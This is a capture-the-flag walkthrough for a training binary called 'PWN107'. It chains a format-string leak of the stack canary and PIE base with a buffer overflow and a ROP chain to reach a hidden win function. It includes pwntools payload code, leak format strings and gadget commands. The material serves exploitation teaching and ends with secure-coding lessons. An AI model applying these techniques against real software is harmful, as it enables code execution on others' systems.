# PWN107 CTF Walkthrough

## Executive Summary

This challenge combines multiple exploitation techniques: format string leak, stack canary bypass, and return-oriented programming (ROP). The binary has all modern protections enabled (canary, NX, PIE, Full RELRO), requiring a multi-stage attack. First, format string is used to leak the canary and PIE base address. Then, a buffer overflow overwrites the return address with a ROP chain to call the hidden `get_streak()` function.

---

## Phase 1: Reconnaissance

### 1.1 File Information

**Target Binary:** `/home/jack/Documents/hacktivities/projects/pwn ctfs/pwn107/pwn107`

**File Type Analysis:**
```
ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked
PIE enabled
Not stripped
```

### 1.2 Security Protections Analysis

Using `checksec`:

| Protection | Status | Impact |
|-----------|--------|--------|
| **RELRO** | **Full RELRO** | GOT table read-only, cannot modify |
| **Stack Canary** | ✅ Found | **CRITICAL: Must be bypassed** |
| **NX** | ✅ Enabled | Stack/heap not executable |
| **PIE** | ✅ Enabled | **CRITICAL: Addresses randomized** |
| **Stripped** | ❌ No | Symbols available for analysis |

**Key Finding:** ALL protections enabled! This is a fully hardened binary.

### 1.3 Program Behavior

```
Banner: "pwn 107"
Story: User lost THM streak, needs to answer questions
Prompt 1: "THM: What's your last streak? Thanks, Happy hacking!!"
Action 1: Reads 20 bytes (0x14)
Output: "Your current streak: [input]"
Prompt 2: (Second input prompt after several days message)
Action 2: Reads 512 bytes (0x200)
```

**Critical Observations:**
1. First input (20 bytes) is printed back with printf - potential format string!
2. Second input (512 bytes) into a small buffer - potential overflow!

---

## Phase 2: Binary Analysis

### 2.1 Hidden Function: get_streak()

```assembly
000000000000094c <get_streak>:
 94c: 55                    push   %rbp
 94d: 48 89 e5              mov    %rsp,%rbp
 950: 48 83 ec 10           sub    $0x10,%rsp
 954-95b: [canary setup]
 ... 
 989: 74 05                 je     990
 98b: e8 90 fd ff ff        call   <__stack_chk_fail@plt>
 990: c9                    leave
 991: c3                    ret
```

This function is never called in normal execution but exists in the binary. It's likely the win function!

### 2.2 Main Function Analysis

**First Input (Format String Leak):**
```assembly
0x9fe: lea    -0x40(%rbp),%rax      # Buffer at RBP-0x40
0xa02: mov    $0x14,%edx            # 20 bytes
0xa14: call   <read@plt>            # Read first input

0xa19: lea    0x338(%rip),%rdi      # "Your current streak: "
0xa25: call   <printf@plt>          # Safe printf

0xa2a: lea    -0x40(%rbp),%rax      # User buffer
0xa2e: mov    %rax,%rdi
0xa36: call   <printf@plt>          # VULNERABLE: User input as format string!
```

**Second Input (Buffer Overflow):**
```assembly
0xa53: lea    -0x20(%rbp),%rax      # Buffer at RBP-0x20 (32 bytes!)
0xa57: mov    $0x200,%edx           # 512 bytes to read!
0xa69: call   <read@plt>            # OVERFLOW: 512 into 32!
```

### 2.3 Stack Layout Analysis

**During First Input (Format String):**
```
RBP + 0x0      ← Frame Pointer
RBP - 0x8      ← Canary (from %fs:0x28)
RBP - 0x40     ← First input buffer (20 bytes)
```

**During Second Input (Overflow):**
```
RBP + 0x8      ← Return Address (target for ROP)
RBP + 0x0      ← Saved Frame Pointer
RBP - 0x8      ← Canary (must match for safe return)
RBP - 0x20     ← Second input buffer (32 bytes, but reads 512!)
```

**Overflow Math:**
- Buffer to canary: 0x20 - 0x8 = 0x18 = 24 bytes
- Canary: 8 bytes
- Saved RBP: 8 bytes  
- **Total offset to return address: 24 + 8 + 8 = 40 bytes**

---

## Phase 3: Exploitation Strategy

### 3.1 Attack Overview

**Multi-Stage Exploitation:**
1. **Stage 1:** Use format string to leak canary value
2. **Stage 2:** Use format string to leak PIE base address
3. **Stage 3:** Calculate address of `get_streak()` function
4. **Stage 4:** Overflow buffer with: padding + canary + RBP + ROP chain

### 3.2 Stage 1: Format String Leak - Canary

**Objective:** Find canary position on stack

The canary is stored at RBP-0x8. Format string arguments start after the 6 register arguments (RDI, RSI, RDX, RCX, R8, R9), then read from stack.

**Testing:** Send `%1$p`, `%2$p`, `%3$p`... and observe which index contains the canary.

Through testing (or using the fuzzer() function), we find:
- **Position 13:** Contains the stack canary
- **Position 17:** Contains a return address (PIE leak)

**Payload:** `%13$p.%17$p`

**Example Output:** `0x726c889ce8ccf300.0x55dba5e00992`
- Canary: 0x726c889ce8ccf300
- Leaked address: 0x55dba5e00992 (points to main function)

### 3.3 Stage 2: Calculate Base Address

**PIE Base Calculation:**
```python
main_leak = 0x55dba5e00992          # Leaked address
main_offset = 0x992                 # From objdump (offset of main)
elf_base = main_leak - main_offset  # 0x55dba5e00000
```

Now all function addresses can be calculated:
```python
get_streak_offset = 0x94c
get_streak_addr = elf_base + get_streak_offset
```

### 3.4 Stage 3: ROP Chain Construction

**Goal:** Call `get_streak()` with proper stack alignment

**Issue:** x86-64 requires RSP to be 16-byte aligned before `call` instructions.

**Solution:** Add a `ret` gadget before the target function address.

**ROP Chain:**
```
[24 bytes padding]     # Fill buffer
[8 bytes canary]       # Bypass canary check
[8 bytes junk RBP]     # Overwrite saved RBP (any value)
[ret gadget address]   # Stack alignment
[get_streak address]   # Target function
```

### 3.5 Why `ret` Gadget Matters

The `ret` instruction:
1. Pops an address from stack into RIP
2. Increments RSP by 8
3. Jumps to that address

This extra stack pop ensures RSP is 16-byte aligned for the subsequent function call, preventing segfaults in function prologue.

---

## Phase 4: Exploitation in Detail

### 4.1 Finding Format String Offsets

**Fuzzer Function:**
```python
for i in range(50):
    payload = f"%{i}$p".encode()
    # Send and observe output
    # Position 13: Canary
    # Position 17: Code address
```

### 4.2 Leak Extraction

**Payload:** `%13$p.%17$p`

**Parsing Response:**
```python
response = "0x726c889ce8ccf300.0x55dba5e00992"
parts = response.split(".")
canary = int(parts[0], 16)          # 0x726c889ce8ccf300
main_addr = int(parts[1], 16)       # 0x55dba5e00992
base_addr = main_addr - 0x992       # 0x55dba5e00000
```

### 4.3 ROP Gadget Discovery

Using pwntools ROP:
```python
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
```

Common `ret` gadget locations:
- Near function epilogues
- In libc
- Automatically found by ROP tools

### 4.4 Payload Assembly

```python
from pwn import *

offset = b"A" * 24              # Fill to canary
canary_bytes = p64(canary)      # Leaked canary (8 bytes)
fake_rbp = b"B" * 8             # Fake saved RBP (8 bytes)
ret_gadget = p64(ret_addr)      # Alignment gadget (8 bytes)
target = p64(get_streak_addr)   # Target function (8 bytes)

payload = offset + canary_bytes + fake_rbp + ret_gadget + target
```

**Total Payload Size:** 24 + 8 + 8 + 8 + 8 = 56 bytes (well under 512-byte limit)

---

## Phase 5: Why Each Protection Fails

| Protection | Bypass Technique | Why It Works |
|-----------|------------------|--------------|
| **Canary** | Format string leak | Canary value read from stack, then replayed |
| **PIE** | Format string leak | Code address leaked, base calculated |
| **NX** | ROP chain | Use existing code, no shellcode needed |
| **Full RELRO** | Not targeted | Didn't need to modify GOT |

**Key Insight:** Even with all protections, information disclosure (format string) enables bypassing everything else!

---

## Phase 6: Key Learnings

| Concept | Explanation |
|---------|------------|
| **Format String Exploitation** | Read arbitrary stack values to leak secrets |
| **Canary Bypass** | Leak canary, replay it to pass check |
| **PIE Bypass** | Leak code address, calculate base offset |
| **ROP (Return-Oriented Programming)** | Chain existing code gadgets for execution |
| **Stack Alignment** | x86-64 requires 16-byte RSP alignment |
| **Multi-Stage Attacks** | Combine multiple techniques for full exploitation |

---

## Phase 7: Attack Flow Diagram

```
[1] Send Format String
      ↓
[2] Leak Canary & PIE Base
      ↓
[3] Calculate Addresses
      ↓
[4] Construct ROP Chain
      ↓
[5] Send Overflow Payload
      ↓
[6] Canary Check Passes
      ↓
[7] Return to ROP Chain
      ↓
[8] Execute get_streak()
      ↓
[9] Win!
```

---

## Phase 8: Comparison with Previous Challenges

| Challenge | Techniques Used | Protections | Complexity |
|-----------|----------------|-------------|------------|
| PWN101-103 | Buffer overflow | None | Beginner |
| PWN104 | Shellcode injection | No NX | Intermediate |
| PWN105 | Integer overflow | All enabled | Intermediate |
| PWN106 | Format string leak | All enabled | Advanced |
| **PWN107** | **Format string + Canary bypass + PIE bypass + ROP** | **All enabled** | **Expert** |

**Progression:** PWN107 combines ALL previous techniques into a single exploit!

---

## Phase 9: Exploitation Steps

1. **Reconnaisance:** Analyze binary, find format string and buffer overflow
2. **Leak Canary:** Send `%13$p.%17$p` to leak canary and code address
3. **Calculate Addresses:** Determine PIE base and target function address
4. **Find ROP Gadget:** Locate `ret` instruction for stack alignment
5. **Craft Payload:** Assemble overflow with canary, RBP, ret gadget, target
6. **Send Payload:** Deliver overflow to second input
7. **Execute:** Program returns to ROP chain, calls `get_streak()`
8. **Success:** Win function executed!

---

## Commands Reference

```bash
checksec --file=./pwn107
objdump -d ./pwn107 | grep -A 20 "<main>:"
objdump -d ./pwn107 | grep -A 10 "<get_streak>:"
ROPgadget --binary ./pwn107 | grep "ret"
python3 exploit.py  # Full exploitation
```

---

## Conclusion

PWN107 represents the pinnacle of the CTF series, combining:
- Format string vulnerability for information disclosure
- Canary bypass through leakage
- PIE bypass through address leakage
- ROP chain for code execution
- All modern protections enabled

The key lesson: **Defense in depth is critical**. A single vulnerability (format string) enabled bypassing ALL other protections. Secure coding practices (proper printf usage, bounds checking) are as important as compiler-level protections.

This challenge demonstrates that even a "fully hardened" binary can be exploited if there's a single logical flaw that leaks information. Modern exploitation often chains multiple techniques, and defenders must eliminate ALL vulnerabilities, not just add protections.
